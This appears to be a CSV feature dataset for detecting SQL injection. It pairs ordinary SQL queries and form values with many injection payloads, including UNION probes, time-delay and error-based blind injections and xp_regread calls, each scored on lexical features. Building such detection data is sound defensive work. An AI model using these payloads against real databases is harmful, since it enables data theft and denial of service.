,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
30468,select top 50 percent * from went select * from that fetch first 50 percent rows onlyselect top 3 * from ear,0,0,3,0,0,21,0,0,3,0,0,79,5,0,6,4.68213122712422,6.736714051207547
21912,select * from  ( select attack from nearby ) ,0,0,3,0,0,9,0,0,1,0,0,32,0,0,2,3.80666248977032,5.101693885125393
15278,7576,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
9058,1'+  (  select 'ueak' where 7329  =  7329 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',4,0,65,0,0,80,0,11,2,0,0,90,53,10,2,5.942799375126701,9.493452396418846
11079,"iif  (  1305  =  5656,1,1/0  )  ",0,0,6,0,0,6,0,0,1,0,0,3,11,0,0,3.4657359027997265,4.519779854678687
389," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",0,2,9,1,0,18,0,2,3,0,0,26,4,0,1,4.143134726391533,5.7053230539652695
1075,1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'smrw' like 'smrw,4,0,64,0,0,76,0,12,0,0,0,104,45,10,1,5.937536205082426,9.480848744805993
18426,karem,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
20831,select * from correct where mainly = 'gone' limit 3,2,0,4,0,0,9,0,0,1,0,0,37,1,0,1,3.9318256327243257,5.322755734775789
2483,1'   )    )    as cimd where 9608  =  9608,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0,3.737669618283368,4.981567234930947
20895,select * from running where    not frog = 'forest',2,0,4,0,0,8,0,1,1,0,0,35,0,0,1,3.912023005428146,5.287509109454676
9936,"1  )   as ezje where 5234  =  5234 and make_set  (  8403  =  8403,8899  )  --",0,0,9,1,0,15,0,1,2,0,0,21,21,0,0,4.343805421853684,6.0797984693327525
9717,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",0,1,11,0,0,5,0,0,1,0,0,14,36,0,1,4.23410650459726,5.873719016140452
5247,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""ijop""  =  ""ijop",0,4,37,0,0,61,0,2,2,0,0,110,55,0,7,5.777652323222656,9.102587570813418
14307,hani,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
30193,select * from bear where standard  between 10 and 20,0,0,1,0,0,9,0,1,1,0,0,37,4,0,1,3.951243718581428,5.357417698153898
15750,encatusar,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
22395,select * from  ( select machine from combine ) ,0,0,3,0,0,9,0,0,1,0,0,34,0,0,2,3.8501476017100575,5.178036175455065
10723,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",0,1,27,1,0,39,0,1,3,0,1,55,40,0,3,5.3612921657094255,8.158268106249867
17877,19462,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
6106,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""ppml""  =  ""ppml",0,4,16,0,0,22,0,2,1,0,0,39,2,0,2,4.700480365792417,6.77328459478072
21344,"select * from announced where health between ""yourself"" and    ""that""",0,4,5,0,0,9,0,1,1,0,0,52,0,0,1,4.23410650459726,5.873719016140452
27923,select * from behavior where oxygen = 'saw' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,50,1,0,3,4.204692619390966,5.819025031871101
7199,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",0,0,9,0,0,13,0,0,1,0,0,73,3,0,2,4.634728988229636,6.642694885740106
1008,"1%' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and '%'  =  '",4,0,28,0,0,27,2,5,0,0,0,39,16,4,0,4.90527477843843,7.188213210536463
10070,"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",1,0,13,1,0,4,0,0,3,0,0,14,44,0,1,4.31748811353631,6.030055566276218
8948,"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'ngxz'  =  'ngxz",4,0,24,0,0,27,0,2,0,0,1,45,39,0,1,5.14166355650266,7.682946600407132
26575,"  select world as hide, youth as [flat]  from brave",0,0,3,0,0,9,0,0,0,0,0,37,0,0,1,3.9318256327243257,5.322755734775789
2626,"1%""  )   order by 1#",0,1,4,0,0,4,1,0,0,0,0,7,2,0,1,2.995732273553991,3.7638991627446954
30075,select * from rubber 3 select * from average,0,0,2,0,0,8,0,0,2,0,0,33,1,0,2,3.784189633918261,5.062431490914847
1276,1'  )   and 4595  =  4595#,1,0,4,0,0,5,0,1,0,0,0,3,9,0,0,3.258096538021482,4.179397132269193
759," select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'",3,0,14,1,0,16,0,0,3,0,0,40,3,0,2,4.394449154672439,6.17606445953937
15706,35is117r,0,0,0,0,0,0,0,0,0,0,0,3,5,0,0,2.079441541679836,2.432300417938136
25061,select min ( doubt )  as horn from work,0,0,2,0,0,8,0,0,0,0,0,28,0,0,1,3.6635616461296463,4.853884482035236
2253,"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255",0,0,19,0,0,36,0,2,1,0,0,111,20,0,2,5.407171771460119,8.25951363490737
4644,"-9054""  )   as rgyu where 3792  =  3792 order by 1--",0,1,6,1,0,10,0,0,3,0,0,18,13,0,1,3.951243718581428,5.357417698153898
21394," select * from machine order by range, eight",0,0,2,0,0,8,0,0,1,0,0,34,0,0,2,3.784189633918261,5.062431490914847
24959,select top 3 * from minerals where nails = 'direction',2,0,4,0,0,9,0,0,1,0,0,40,1,0,2,3.9889840465642745,5.42506920217274
26055,select avg ( handsome ) from hunter,0,0,2,0,0,6,0,0,0,0,0,27,0,0,2,3.555348061489413,4.669921102482963
22883,select * from fewer,0,0,1,0,0,3,0,0,1,0,0,15,0,0,1,2.9444389791664403,3.684523708911846
21810,select * from powerful where two = 'chain' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,49,1,0,3,4.189654742026425,5.791153910047609
20796,select * from yellow where    not now = 'bend',2,0,4,0,0,8,0,1,1,0,0,31,0,0,1,3.828641396489095,5.140218969441503
4431,"-4047'||  (  select 'rqta' from dual where 9743  =  9743 union all select 9743,9743,9743#",3,0,11,0,0,13,0,1,1,0,0,37,24,0,2,4.48863636973214,6.357017110069445
16617,sitiwet-chagas@creacionesacampada.travel,0,0,3,0,0,0,0,0,1,0,0,37,0,0,0,3.688879454113936,4.897348914472564
20208," select * from manner order by ten asc, winter desc",0,0,2,0,0,10,0,0,1,0,0,39,0,0,2,3.9318256327243257,5.322755734775789
6338,"1'  )   where 3703  =  3703 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,17,1,0,32,0,1,3,0,0,114,20,0,2,5.298317366548036,8.020404765352982
15177,ezio,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
7071,"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",0,1,14,0,0,6,1,0,1,0,0,14,40,0,1,4.406719247264253,6.199496085735905
15692,bili,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
754,or,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0.6931471805599453,0.7296931454567191
16824,laga_rtijo,0,0,1,0,0,0,0,0,0,0,0,9,0,0,0,2.302585092994046,2.7402564225600523
21308,select top 3 * from use,0,0,1,0,0,5,0,0,1,0,0,16,1,0,2,3.1354942159291497,3.983240309714999
9498,1'||  (  select 'npel' from dual where 5258  =  5258,3,0,7,0,0,9,0,1,0,0,0,23,9,0,1,3.951243718581428,5.357417698153898
12670,abietceo,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
10451,"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",2,0,46,0,0,55,0,6,2,2,0,86,37,9,1,5.634789603169249,8.772035730416764
17185,"plaza de el salvador 91,",0,0,1,0,0,4,0,0,0,0,0,17,2,0,0,3.1780538303479458,4.05093304771096
21439,select * from mostly where soon in  ( select running from as ) ,0,0,3,0,0,13,0,0,1,0,0,46,0,0,2,4.143134726391533,5.7053230539652695
10928,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",3,0,19,1,0,24,0,1,4,0,0,46,23,0,1,4.948759890378168,7.277936646208279
10912,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--",1,0,14,1,0,7,1,0,2,8,0,46,1,8,1,4.3694478524670215,6.128451232979604
2539,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",0,3,8,0,0,11,0,1,0,0,0,26,1,0,1,4.127134385045092,5.675937336868984
9964,"-1339   )    )     )   union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",0,0,13,0,0,7,0,0,1,0,0,14,40,0,1,4.442651256490317,6.268357393526619
17435,hatajo,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
8231,1'  )   as epgz where 2898  =  2898 and 7028  =  2287#,1,0,5,0,0,11,0,1,0,0,0,14,17,0,0,3.9889840465642745,5.42506920217274
12478,cab,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,1.0986122886681098,1.19230319601282
26195,select government from dull union select colony from fourth order by personal,0,0,0,0,0,11,0,0,0,0,0,66,0,0,3,4.343805421853684,6.0797984693327525
17783,8ro4,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,1.3862943611198906,1.5376610839645055
11573,shou-che,0,0,1,0,0,0,0,0,1,0,0,7,0,0,0,2.079441541679836,2.432300417938136
1623,1 where 4641  =  4641,0,0,1,0,0,4,0,0,0,0,0,5,9,0,0,3.044522437723423,3.839958531231341
16163,38747118f,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
12337,calle nicolas funes 116,0,0,0,0,0,3,0,0,0,0,0,17,3,0,0,3.1354942159291497,3.983240309714999
15777,7839,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
20035,select sysdate (  )  + 1;,0,0,4,0,0,5,0,0,1,0,0,13,1,0,1,3.218875824868201,4.116261188933881
13824,agujer4e2o,0,0,0,0,0,0,0,0,0,0,0,8,2,0,0,2.302585092994046,2.7402564225600523
19695,select column_name from table_name where column_name operator any,0,0,3,0,0,7,0,0,0,0,0,55,0,0,1,4.174387269895637,5.762920220853171
10869,"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",1,0,21,0,0,33,0,0,2,0,0,60,19,0,4,5.170483995038151,7.744448643253457
18126,f5o9a8en9e,0,0,0,0,0,0,0,0,0,0,0,6,4,0,0,2.302585092994046,2.7402564225600523
28585,"   select left, command, respect from sail where worried  is null",0,0,2,0,0,10,0,0,0,1,0,50,0,1,1,4.174387269895637,5.762920220853171
11717,f8av2,0,0,0,0,0,0,0,0,0,0,0,3,2,0,0,1.6094379124341005,1.8157827456852256
12765,$amarulencia,0,0,1,0,0,0,0,0,0,0,0,11,0,0,0,2.4849066497880004,2.999482870035824
7084,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,0,18,0,0,22,0,0,0,0,1,50,23,0,0,4.976733742420574,7.335959393126002
19522,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 239190 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,6,0,2,4.6443908991413725,6.6618055138595045
17025,2331,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
16014,07951538r,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
3121,"-8472'  )   where 3340  =  3340 or make_set  (  1752  =  9905,9905  )  --",1,0,11,1,0,13,0,1,3,0,0,14,24,0,0,4.290459441148391,5.97916802637938
14952,cybolski.doumanian@cortinasartesol.bh,0,0,3,0,0,0,0,0,0,0,0,34,0,0,0,3.610917912644224,4.764024421755989
2092,"1' in boolean mode  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  #",1,0,33,0,0,60,0,1,2,0,0,112,55,0,7,5.749392985908253,9.036649932896577
13855,terrill,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
10828,"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  -- xsob",0,0,29,1,0,36,0,4,2,1,0,56,24,6,0,5.19295685089021,7.792586250719604
1274,select case when 6420  =  7941 then 1 else null end--,0,0,3,1,0,10,0,0,2,1,0,29,9,1,1,3.970291913552122,5.391515666300752
1503,1'+  (  select 'hcqf' where 9956  =  9956 and   (  2993  =  4297  )  *4297  )  +',4,0,13,0,0,16,0,1,3,0,0,18,21,0,1,4.394449154672439,6.17606445953937
13569,11738063j,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
7991,"1' where 2774  =  2774 union all select null,null,null,null,null#",1,0,7,0,0,8,0,0,0,5,0,39,9,5,1,4.174387269895637,5.762920220853171
183,; exec xp_regread,0,0,2,0,0,2,0,0,0,0,0,13,0,0,0,2.833213344056216,3.514446415767603
26113,select * from deer where soldier = 'dirt'  and city = 'aboard',4,0,7,0,0,11,0,1,1,0,0,43,0,0,1,4.127134385045092,5.675937336868984
17808,gen7o,0,0,0,0,0,0,0,0,0,0,0,4,1,0,0,1.6094379124341005,1.8157827456852256
22539,select * from north where metal between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,35,16,0,1,4.23410650459726,5.873719016140452
23000,select * from certain fetch first 3 rows only select top 50 percent * from system,0,0,2,0,0,15,0,0,2,0,0,61,3,0,5,4.394449154672439,6.17606445953937
16674,valdehorna,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
12340,"alqueria de coca 38,",0,0,1,0,0,3,0,0,0,0,0,14,2,0,0,2.995732273553991,3.7638991627446954
13889,49si90q00m87a,0,0,0,0,0,0,0,0,0,0,0,5,8,0,0,2.5649493574615367,3.1155015354702966
8963,"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,0,4,17,0,0,17,2,2,0,0,0,9,13,0,0,4.465908118654584,6.313121924766899
14716,50228,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
10601,"-1258""   )    )    union all select 7734,7734,7734#",0,1,7,0,0,6,0,0,1,0,0,14,16,0,1,3.9318256327243257,5.322755734775789
15665,daniza,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
1412,1 where 5691  =  5691 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,0,0,12,1,0,21,0,1,3,0,0,33,10,0,2,4.605170185988092,6.584397772472616
21563,select closer ( s )  from numeral union,0,0,2,0,0,7,0,0,0,0,0,29,0,0,1,3.6635616461296463,4.853884482035236
15614,josu,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
5008,1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,0,14,0,0,24,0,1,2,0,0,42,10,0,3,4.7535901911063645,6.879692212398552
4129,"1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",4,0,17,0,0,21,0,3,0,0,1,38,29,0,1,4.8283137373023015,7.030817503794459
15320,6.39e+14,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
16038,talavera panfili,0,0,0,0,0,1,0,0,0,0,0,15,0,0,0,2.772588722239781,3.4229084603450888
6067,"-2230%"" union all select 3303,3303,3303--",0,1,7,1,0,4,1,0,3,0,0,14,16,0,1,3.713572066704308,4.939896154656966
12477,3ist423o,0,0,0,0,0,0,0,0,0,0,0,4,4,0,0,2.079441541679836,2.432300417938136
28813,select avg ( movie )  from whose  select sum ( rain ) ,0,0,4,0,0,12,0,0,0,0,0,36,0,0,4,3.9889840465642745,5.42506920217274
18700,6928,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
27576,"   select employees.level, count ( orders.additionid )  as circusfrom    ( ordersinner join service on orders.southid  =  employees.stairsid ) ",0,0,10,0,0,18,0,0,0,0,0,107,0,0,3,4.962844630259907,7.307121077867987
4007,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",0,4,22,0,0,26,0,2,0,0,1,52,35,0,1,5.147494476813453,7.695368610288299
7908,"1'+  (  select 'bztp' where 2541  =  2541 union all select null,null,null,null,null,null,null,null,null,null--",3,0,17,1,0,11,0,0,3,10,0,69,9,10,2,4.700480365792417,6.77328459478072
30470,select top 3 * from send where birth = 'hollow' select * from liquid,2,0,5,0,0,13,0,0,2,0,0,49,1,0,3,4.219507705176107,5.846543550882007
1279,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  5432  =  5432",0,0,16,0,0,18,0,1,1,0,0,63,13,0,2,4.852030263919617,7.079131308912657
18842,48289,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
15947,19115,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
27809,select * from trick fetch first 3 rows only,0,0,1,0,0,8,0,0,1,0,0,33,1,0,3,3.7612001156935615,5.022400427811018
30285,select * from never where settle not like 'organized%',2,0,4,0,0,8,1,1,1,0,0,42,0,0,1,3.9889840465642745,5.42506920217274
9151,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'opyt'  =  'opyt",3,0,19,0,0,23,0,1,0,1,0,49,14,2,0,4.90527477843843,7.188213210536463
5702, ) ,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,1.0986122886681098,1.19230319601282
13027,bullicioso,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
17681,76156835v,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
6816,"1%'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",4,0,36,0,0,40,2,5,0,1,0,55,24,6,0,5.293304824724492,8.009486135188531
26228,select * from across,0,0,1,0,0,3,0,0,1,0,0,16,0,0,1,2.995732273553991,3.7638991627446954
14966,47320,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
3298,"1 union all select null,null,null,null,null,null--",0,0,7,1,0,4,0,0,2,6,0,38,1,6,1,3.912023005428146,5.287509109454676
634, or 0  =  0 #,0,0,2,0,0,5,0,1,0,0,0,2,2,0,0,2.5649493574615367,3.1155015354702966
12024,2293,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
27610,select top 3 * from habit,0,0,1,0,0,5,0,0,1,0,0,18,1,0,2,3.218875824868201,4.116261188933881
1645,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  '%'  =  '",3,0,18,0,0,16,1,1,1,0,0,63,5,0,2,4.718498871295094,6.809292299444515
10139,"1%""   )    )     )   waitfor delay '0:0:5'--",2,1,11,1,0,6,1,0,2,0,0,12,4,0,0,3.784189633918261,5.062431490914847
19677," select city, country from suppliers where country = 'germany' order by city;",2,0,5,0,0,12,0,0,0,0,0,60,0,0,2,4.343805421853684,6.0797984693327525
24789,"  select * from private where cast not in  ( 'those', 'roar', 'crowd' )  ",6,0,11,0,0,14,0,1,1,0,0,45,0,0,1,4.290459441148391,5.97916802637938
9906,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",3,0,16,1,0,13,0,1,3,0,0,37,40,0,2,4.700480365792417,6.77328459478072
24278,select * from standard fetch first 3 rows only select top 50 percent * from seeing,0,0,2,0,0,15,0,0,2,0,0,62,3,0,5,4.406719247264253,6.199496085735905
2446,"1%' union all select null,null,null,null,null,null,null,null--",1,0,11,1,0,4,1,0,2,8,0,46,1,8,1,4.127134385045092,5.675937336868984
20849,select * from be where clock between 'current' and 'tide',4,0,5,0,0,9,0,1,1,0,0,43,0,0,1,4.04305126783455,5.522643883333643
22475,select * from anywhere where black = 'impossible'  or become = 'substance',4,0,7,0,0,11,0,1,1,0,0,55,0,0,1,4.30406509320417,6.004758445183105
14366,70243797a,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
15887,"calle olivos de pea nevada, 124,",0,0,2,0,0,5,0,0,0,0,0,22,3,0,0,3.4657359027997265,4.519779854678687
22172,from  ( select distinct soldier from mail ) ,0,0,2,0,0,8,0,0,0,0,0,33,0,0,1,3.784189633918261,5.062431490914847
29167,select * from shoulder where not minute = 'appropriate'  and not among = 'win',4,0,7,0,0,13,0,2,1,0,0,57,0,0,1,4.356708826689592,6.104257869167092
22121,select avg ( musical ) from dead select sum ( road ) ,0,0,4,0,0,12,0,0,0,0,0,37,0,0,4,3.970291913552122,5.391515666300752
7023,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'gbpg'  =  'gbpg",4,0,21,0,0,25,0,1,0,0,1,60,24,0,0,5.10594547390058,7.607085866005653
6979,"1' in boolean mode  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",3,0,16,0,0,21,0,1,1,0,0,45,15,0,0,4.8283137373023015,7.030817503794459
